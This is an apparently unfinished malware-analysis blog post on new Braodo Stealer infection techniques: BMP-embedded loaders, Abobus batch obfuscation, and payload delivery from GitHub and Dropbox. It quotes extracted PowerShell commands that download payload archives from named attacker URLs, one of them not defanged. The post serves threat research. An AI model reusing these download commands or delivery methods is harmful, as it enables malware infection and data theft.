---
title:  "Fresh Infections Of Braodo Stealer With Updated Techniques"
layout: post
categories: malware-analysis
---

## Contents

- Background.
- Technical Analysis.
    - Abusing .bmp file format.
    - Encoding and Obfuscation.
    - Abusing Dropbox services.
- Conclusion.

## Background


Hi readers, hope you enjoyed my last blog on Braodo Stealer, as a newbie and as I'm just getting started I have decided to track the same, so recently I found that Braodo Stealer is back with a bunch of changes on their arsenal , which includes adding Base64 encoding along with renaming variable names and then abusing an open source obfuscator known as Abobas-Obfuscator. Well, the last but not the least that's using different file formats like .bmp and abusing Dropbox services for payload delivery.

## Technical Analysis.

In this phase, we will know different methods that this stealer uses to download the payload and run the malware code in the system


### Abusing .bmp file format.

One of the recent developments of Braodo Stealer's arsenal has been abusing bmp format for initial infections.

![image](https://github.com/user-attachments/assets/eb044983-e72d-46d3-a6a1-2701f87ea7f7)


So, we can see that there is encoded garbage blob present inside the bmp payload and the actual script which is responsible for downloading the final payload from Github which is exactly the same just like the previous campaigns with just different Github accounts downloading the final Python script.

### Encoding and obfuscation.

Another interesting development among stealer arsenal, that it has been using an open source obfuscator,known as abobus obfuscator.we found the name of the obfuscator as it is present in one of the sample.

![image](https://github.com/user-attachments/assets/0d2dae90-19d0-4d1d-b143-6ae11d6843ee)

the way this obfuscator works is by adding garbage values to the batch script then performing character encoding and by changing the cases of the alphabets in a random manner. The way the sample deobfuscates and runs in memory is by changing the code page by using chcp windows utility and chnaging the code page to english which further faciliates the execution of the malicious batch script which downloads the zip payload from either dropbox or github. As this is an open source obfuscator it was quite easy to understand and perform the deobfuscation.

the extracted config is as follows:

```
[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12
(new-object -typename system.net.webclient).downloadfile("hxxps://github.com/LoneNone1807/abcxyz/raw/main/abcxyz.zip", "C:\\Users\\Public\\25350.zip")

```
 
### Abusing Dropbox services.

as we know that the primary technique of braodo stealer is to store the final payload over github, but recently in one of the campaign which was obfuscated with abobus obfuscator was dropping a document as a lure . The document was mainly focused on online marketing of shooes. 


![image](https://github.com/user-attachments/assets/7a8ed849-736e-4b87-92aa-3f92b0f4ca36)

So , post the lure did open on the screen, i deobfuscated and found out that this campaign is using dropbox services to download the payload and also adding a registry key as persistance. the extracted configs are as follows:

```
[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12
(new-object -typename system.net.webclient).downloadfile("hxxps://www.dropbox.com/scl/fi/mkx2tii0ud0i6ugpbbjh6/Product_Marketing_and_Brand_Marketing_Campaigns0909.docx?rlkey=4gqc2cpjo6kp5iltdjevlbxzv&st=50y5pfp4&dl=1", "C:\\Users\\Admin\\AppData\\Local\\Temp\\\\Product_Marketing_and_Brand_Marketing_Campaigns0909.docx")
```

```
[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12
(new-object -typename system.net.webclient).downloadfile("https://www.dropbox.com/scl/fi/0qh04if44j5q056ehruij/tn0909.zip?rlkey=f9zmunjbhjdmsuh7by9bp4wf1&st=ffsvc7c8&dl=1", "C:\\Users\\Public\\Document.zip")
```

### Abusing whl package

## Conclusion.



